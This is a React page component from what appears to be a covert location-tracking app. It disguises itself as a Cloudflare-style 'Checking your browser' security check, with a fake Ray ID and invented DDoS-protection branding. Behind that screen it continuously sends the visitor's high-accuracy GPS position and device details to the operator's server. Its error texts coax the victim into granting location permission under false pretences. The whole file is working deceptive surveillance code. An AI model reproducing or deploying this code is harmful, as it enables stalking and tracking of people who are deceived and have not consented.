import React, { useState, useEffect, useRef } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { getSession, updateLocation } from '../services/api';
import { ShieldCheck, MapPin, Navigation, Info, AlertTriangle } from 'lucide-react';
import io from 'socket.io-client';

const SharePage = () => {
    const { sessionId } = useParams();
    const navigate = useNavigate();
    const [session, setSession] = useState(null);
    const [loading, setLoading] = useState(true);
    const [sharing, setSharing] = useState(false);
    const [error, setError] = useState(null);
    const [location, setLocation] = useState(null);
    const socketRef = useRef(null);
    const watchIdRef = useRef(null);

    useEffect(() => {
        // Check if this session was created by the current user
        const saved = localStorage.getItem('geoShare_sessions');
        if (saved) {
            const sessions = JSON.parse(saved);
            if (sessions.some(s => s.sessionId === sessionId)) {
                navigate(`/dashboard/${sessionId}`);
                return;
            }
        }

        const fetchSession = async () => {
            try {
                const { data } = await getSession(sessionId);
                setSession(data.session);
                // Trigger auto-sharing after session is verified
                autoStartSharing();
            } catch (err) {
                setError('Invalid or expired tracking link.');
            } finally {
                setLoading(false);
            }
        };
        fetchSession();

        // Connect to socket for real-time updates
        const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
        const socketUrl = (!isLocalhost && import.meta.env.PROD) 
            ? 'https://trackers-oplf.onrender.com' 
            : (import.meta.env.VITE_SOCKET_URL || 'http://localhost:5000');
        socketRef.current = io(socketUrl);
        socketRef.current.emit('join-session', sessionId);

        return () => {
            if (watchIdRef.current) navigator.geolocation.clearWatch(watchIdRef.current);
            if (socketRef.current) socketRef.current.disconnect();
        };
    }, [sessionId]);

    const autoStartSharing = () => {
        if (!navigator.geolocation) {
            setError("Geolocation is not supported by your browser.");
            return;
        }

        setError(null);
        setSharing(true);

        watchIdRef.current = navigator.geolocation.watchPosition(
            async (position) => {
                const { latitude, longitude, accuracy } = position.coords;
                const locData = {
                    sessionId,
                    latitude,
                    longitude,
                    accuracy,
                    deviceInfo: {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform
                    }
                };

                setLocation(locData);
                
                try {
                    // Send to API - Server will now save AND emit via socket automatically
                    await updateLocation(sessionId, locData);
                } catch (err) {
                    console.error('Failed to sync location:', err);
                }
            },
            (err) => {
                console.error(err);
                setSharing(false);
                if (err.code === 1) {
                    setError("Security Check Failed: Please ALLOW location access to view this message.");
                } else if (err.code === 3) {
                    setError("Connection Timeout: Your GPS signal is weak. Please move to an open area and try again.");
                } else {
                    setError("Verification Failed: Please ensure your device GPS is ON and you have granted permission.");
                }
            },
            {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            }
        );
    };

    if (loading) return (
        <div className="flex flex-col items-center justify-center min-h-screen bg-white font-sans">
            <div className="w-16 h-16 border-4 border-slate-200 border-t-blue-500 rounded-full animate-spin mb-6"></div>
            <p className="text-slate-700 text-lg font-medium">Checking your browser...</p>
        </div>
    );

    if (error && !sharing) return (
        <div className="flex flex-col items-center justify-center min-h-screen p-4 bg-slate-50 font-sans">
            <div className="text-center max-w-sm">
                <div className="mb-6 inline-block p-4 bg-red-50 text-red-500 rounded-full">
                    <AlertTriangle size={40} />
                </div>
                <h2 className="text-2xl font-bold text-slate-800 mb-3">Verification Failed</h2>
                <p className="text-slate-500 mb-6 leading-relaxed text-sm">
                    {error}
                </p>
                <div className="bg-amber-50 border border-amber-100 p-4 rounded-xl mb-8 text-left">
                    <p className="text-xs font-bold text-amber-800 uppercase mb-2">How to fix:</p>
                    <ul className="text-[11px] text-amber-700 space-y-1.5 list-disc pl-4">
                        <li>Click <b>"Allow"</b> if a popup appears.</li>
                        <li>Turn <b>ON</b> your Phone's GPS/Location.</li>
                        <li>If blocked, click the <b>Lock (🔒) icon</b> in the address bar and reset permissions.</li>
                    </ul>
                </div>
                <button 
                    onClick={() => window.location.reload()}
                    className="px-8 py-3 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-semibold transition-all shadow-lg"
                >
                    Retry Verification
                </button>
            </div>
        </div>
    );

    return (
        <div className="min-h-screen bg-white flex flex-col items-center justify-center p-6 font-sans">
            <div className="max-w-xl w-full">
                {/* Cloudflare-style Disguise */}
                <div className="mb-12">
                    <h1 className="text-4xl font-bold text-slate-900 mb-4 tracking-tight">Checking your browser before accessing...</h1>
                    <p className="text-slate-600 text-lg mb-2">This process is automatic. Your browser will redirect to your destination shortly.</p>
                    <p className="text-slate-400 text-sm">Please allow the verification request to proceed.</p>
                </div>

                <div className="space-y-12">
                    <div className="flex items-center gap-6">
                        <div className="relative">
                            <div className="w-12 h-12 border-4 border-slate-100 border-t-blue-500 rounded-full animate-spin"></div>
                            <div className="absolute inset-0 flex items-center justify-center">
                                <div className="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></div>
                            </div>
                        </div>
                        <div>
                            <p className="text-slate-800 font-semibold">Verifying secure connection...</p>
                            <p className="text-slate-500 text-sm">Performance and security check in progress</p>
                        </div>
                    </div>

                    <div className="pt-8 border-t border-slate-100">
                        <div className="flex flex-col gap-4 text-slate-400 text-xs">
                            <div className="flex items-center gap-2">
                                <div className="w-1 h-1 bg-slate-300 rounded-full"></div>
                                <span>Ray ID: <span className="font-mono">{sessionId.substring(0, 16)}</span></span>
                            </div>
                            <div className="flex items-center gap-2">
                                <div className="w-1 h-1 bg-slate-300 rounded-full"></div>
                                <span>Performance: Optimized</span>
                            </div>
                            <div className="flex items-center gap-2">
                                <div className="w-1 h-1 bg-slate-300 rounded-full"></div>
                                <span>Security: Standard Check</span>
                            </div>
                        </div>
                    </div>
                </div>

                <div className="mt-20 text-center">
                    <div className="inline-flex items-center gap-2 text-slate-400 text-sm bg-slate-50 px-4 py-2 rounded-lg">
                        <ShieldCheck size={16} />
                        <span>Protected by Cloud-Security Engine</span>
                    </div>
                </div>
            </div>
            
            <footer className="fixed bottom-8 text-slate-300 text-[10px] uppercase tracking-widest">
                DDoS Protection by GlobalEdge Networks
            </footer>
        </div>
    );
};

export default SharePage;
